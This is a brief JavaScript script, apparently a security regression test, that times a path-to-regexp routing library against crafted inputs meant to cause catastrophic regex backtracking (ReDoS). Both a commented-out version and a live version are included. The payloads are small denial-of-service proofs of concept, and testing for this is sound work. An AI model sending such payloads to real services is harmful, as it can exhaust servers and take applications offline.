/*import { match } from './dist/index.js';  // adjust path if needed

// Malicious input that used to trigger ReDoS
const malicious = '/a'.repeat(50000) + '!';
const pattern = '/:param*';

const fn = match(pattern);

console.time('test');
fn(malicious);
console.timeEnd('test');
*/

import pkg from "./dist/index.js"; // adjust if needed
const { pathToRegexp } = pkg;
const pattern = "/:param(.*a){10000}/"; // crafted ReDoS payload
const input = "a".repeat(20000);

console.time("ReDoS");
try {
  pathToRegexp(pattern).exec(input);
} catch (e) {
  console.error("Parser error:", e.message);
}
console.timeEnd("ReDoS");
